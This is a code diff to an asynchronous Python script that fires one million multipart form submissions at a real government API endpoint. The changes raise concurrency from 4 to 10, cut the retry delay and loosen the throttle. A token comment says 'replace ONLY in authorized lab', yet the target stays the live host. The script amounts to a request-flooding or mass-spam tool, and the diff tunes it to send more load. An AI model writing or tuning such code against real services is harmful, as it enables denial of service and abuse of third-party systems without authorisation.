@@ -8,7 +8,7 @@ import aiohttp
 URL = "https://api.narendramodi.in/mlapiv1"   # ⛔ replace ONLY in authorized lab
 BOUNDARY = "Boundary+TEST123456"
 
-CONCURRENCY = 4
+CONCURRENCY = 10
 MAX_RETRIES = 1
 TOTAL_REQUESTS = 1000000
 
@@ -62,7 +62,7 @@ def build_body(index: int) -> str:
 
         f"--{BOUNDARY}\r\n"
         'Content-Disposition: form-data; name="title"\r\n\r\n'
-        f"Har Ghar Swadeshi, Ghar-Ghar Swadeshi 1#{index}\r\n"
+        f"Har Ghar Swadeshi, Ghar-Ghar Swadeshi 11#{index}\r\n"
 
         f"--{BOUNDARY}\r\n"
         'Content-Disposition: form-data; name="action"\r\n\r\n'
@@ -133,7 +133,7 @@ async def send_request(session, index: int):
 
         except Exception as e:
             print(f"[{index}] Error (attempt {attempt}): {e}")
-            await asyncio.sleep(2)
+            await asyncio.sleep(1)
 
 # =========================================================
 # MAIN EXECUTOR (THROTTLE ADDED ✅)
@@ -157,7 +157,7 @@ async def main():
             tasks.append(asyncio.create_task(runner(i)))
 
             # ✅ SAME THROTTLE AS ORIGINAL SCRIPT
-            if i % 100 == 0:
+            if i % 50 == 0:
                 await asyncio.sleep(5)
 
         await asyncio.gather(*tasks, return_exceptions=True)
